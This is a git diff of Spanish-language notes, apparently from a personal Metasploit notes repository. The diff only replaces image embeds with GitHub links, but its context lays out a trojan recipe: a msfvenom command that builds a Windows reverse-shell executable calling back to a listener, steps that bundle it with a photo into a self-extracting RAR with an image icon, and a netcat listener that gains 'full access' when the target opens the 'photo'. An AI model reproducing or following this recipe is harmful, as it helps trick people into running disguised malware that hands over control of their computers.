@@ -16,21 +16,21 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o
 ---------------------------
 
 # Convertimos a rar seleccionando juntos el virus y la foto y (marcamos las siguientes casillas)
-![[Captura de pantalla 2023-07-04 163709.jpg]]
-![[autoextraible.jpg]]
-![[config 1.jpg]]
+
+![Captura de pantalla 2023-07-04 163709](https://github.com/sav404/Metasploit-notes/assets/169759579/82d3c07a-0f98-480e-8837-00edeced4854)
+![config 1](https://github.com/sav404/Metasploit-notes/assets/169759579/266ab6b5-09b3-47d3-bfab-dc7382f1d59a)
 
 -------------------------------------
 
 # En la pestaña texto e iconos y examinamos en cargar icono desde fichero y elegimos la foto en formato .ico
 
-![[examinar.jpg]]
+![config](https://github.com/sav404/Metasploit-notes/assets/169759579/45910970-34fa-414c-a45a-0159ae673754)
 
 
 
 # Se nos va a crear un archivo como este
 
-![[Captura de pantalla 2023-07-04 165159.jpg]]
+![Captura de pantalla 2023-07-04 165159](https://github.com/sav404/Metasploit-notes/assets/169759579/0066de22-276e-469b-ba12-a32289eaa0a1)
 
 
 # Nos ponemos en escucha con netcat en el puerto para recibir la señal en el momento que el objetivo abra la foto y obtendremos acceso total a su maquina. 
